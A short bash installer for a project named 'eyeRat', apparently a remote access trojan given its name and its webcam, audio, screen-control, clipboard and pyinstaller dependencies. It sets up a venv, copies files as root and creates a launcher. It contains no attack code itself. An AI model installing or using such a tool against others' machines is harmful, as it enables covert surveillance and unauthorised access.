#!/bin/bash
echo "Installing eyeRat..."

python3 -m venv /usr/src/eyerat/venv
/usr/src/eyerat/venv/bin/pip install --quiet clipboard opencv-python PyAudio PyAutoGUI cryptography PyMsgBox Pillow psutil colorama pyinstaller

sudo -u root mkdir -p /usr/src/eyerat/

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

echo "$PROJECT_DIR"

sudo -u root cp -R "$PROJECT_DIR"/* /usr/src/eyerat/

sudo bash -c 'echo "#!/bin/bash
source /usr/src/eyerat/venv/bin/activate
python3 /usr/src/eyerat/eyeRat.py" > /usr/local/bin/eyerat'
sudo -u root chmod +x /usr/local/bin/eyerat

echo "Installation complete!"
echo "Run the tool with: eyerat"